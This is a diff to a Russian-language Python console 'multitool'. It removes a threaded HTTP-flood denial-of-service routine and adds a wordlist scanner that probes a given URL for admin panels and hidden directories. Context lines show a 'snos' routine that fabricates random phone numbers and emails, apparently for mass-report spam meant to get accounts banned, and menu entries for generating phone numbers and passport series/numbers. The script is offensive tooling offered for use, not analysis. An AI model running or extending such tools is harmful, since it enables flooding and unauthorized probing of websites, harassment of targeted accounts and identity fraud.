@@ -11,15 +11,28 @@ from threading import Thread
 
 headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.3'}
 colorama.init()
+print (Fore.YELLOW + "")
+
+
+
+def slow_typing(text, delay=0.02):
+    for char in text:
+        print(char, end='', flush=True)
+        time.sleep(delay)
+    print()
+
+slow_typing("Добро пожаловать! Используйте программу по назначению!")
+
+time.sleep(1)
+
+
 print (Fore.RED + "")
-
-
 
 tprint ("EXIT")
 
-print("------------")
+print("------------------------------------")
 
-print (Fore.BLUE + "")
+print (Fore.YELLOW + "")
 time.sleep(1)
 
 
@@ -58,6 +71,7 @@ def snos():
     ban = (text, name)
     time.sleep(1)
     for i in range(int(kl)):
+        
         num = random.randint(79111111111, 79999999999)
         mail = random.randint(1111111111, 99999999999)
         ms = (str(mail) + ml)
@@ -80,7 +94,7 @@ def sms():
 
 
 print ("_____________________________________________")
-print ("|  1. DOS АТАКА                                             ")
+print ("|  1. Поиск каталогов сайта                                           ")
 print ("|  2. Генератор Номеров                               ")
 print ("|  3. Общение с users через бота тг             ")
 print ("|  4. Генератор Серии/ Номера паспорта   ")
@@ -125,20 +139,154 @@ if user == "3":
 
 if user == "1":
     url = input("url:")
-    th = input("Количество BOTNET:")
-    print ("Атака запущена...")
     
-    def ddos():
-        while(1<10):
-            spam1 = requests.get(url, headers=headers)
-            spam2 = requests.get(url, headers=headers)
-            time.sleep(1)
-            print ("DOS...")
+
+    adm = ['admin', 'webadmin', 'administrator', '0admin', 'manedger', 'hello', 'aadmin', 'admins', 'login', 'auto',]
+
+    kt = [
+    'blog',
+    'users',
+    'settings',
+    'content',
+    'reports',
+    'security',
+    'access',
+    'logging',
+    'support',
+    'integrations',
+    'monitoring',
+    'dashboard',
+    'analytics',
+    'notifications',
+    'roles',
+    'permissions',
+    'database',
+    'backup',
+    'restore',
+    'performance',
+    'activity',
+    'api',
+    'data',
+    'status',
+    'updates',
+    'customization',
+    'themes',
+    'plugins',
+    'modules',
+    'configuration',
+    'logs',
+    'session',
+    'feedback',
+    'groups',
+    'search',
+    'billing',
+    'invoices',
+    'subscriptions',
+    'transactions',
+    'reports',
+    'visualization',
+    'segmentation',
+    'testing',
+    'settings',
+    'sitemap',
+    'cache',
+    'firewall',
+    'certificates',
+    'registration',
+    'policies',
+    'authentication',
+    'verification',
+    'products',
+    'orders',
+    'inventory',
+    'shipping',
+    'payment',
+    'discounts',
+    'promotions',
+    'support',
+    'tickets',
+    'knowledge',
+    'community',
+    'feedback',
+    'requests',
+    'reports',
+    'logs',
+    'settings',
+    'notifications',
+    'engagement',
+    'integration',
+    'metrics',
+    'configuration',
+    'retention',
+    'privacy',
+    'terms',
+    'consent',
+    'compliance',
+    'accessibility',
+    'mobile',
+    'multi-language',
+    'scheduling',
+    'tutorials',
+    'mapping',
+    'cleaning',
+    'validation',
+    'insights',
+    'fields',
+    'tags',
+    'categories',
+    'sources',
+    'segmentation',
+    'metadata',
+    'parameters',
+    'variables',
+    'elements',
+    'settings',
+    'options',
+    'features',
+    'modules',
+    'components',
+    'widgets',
+    'dashboard',
+    'profiles',
+    'roles',
+    'permissions',
+    'settings'
+]
+
+    print ('1. Поиск админ панели')
+    print ('2. Поиск других каталогов')
+    print (Fore.BLUE + '')
+
+    usvb = input("Выерите значение:")
+
+    
+
+    if usvb == "1":
+        for term in adm:
+            
+            res = requests.get(url + term, headers=headers)
+            print (Fore.BLUE + '')
+            if (res.status_code) == 200:
+                print ("+ Запрос отправлен:", term, Fore.YELLOW + "Успешно найдено")
+                
+            else:
+                print ("+ Запрос отправлен:", term, Fore.RED + "No katalog")
+                
+    else:
+        for ln in kt:
+            
+            res = requests.get(url + ln, headers=headers)
+            print (Fore.BLUE + '')
+            if (res.status_code) == 200:
+                print ("+ Запрос отправлен:", ln, Fore.YELLOW + "Успешно найдено")
+                
+            else:
+                print ("+ Запрос отправлен:", ln, Fore.RED + "No katalog")
+                
         
-        
-    for i in range(int(th)):
-        thr = Thread(target = ddos)
-        thr.start()
+
+    
+    
     
     
     
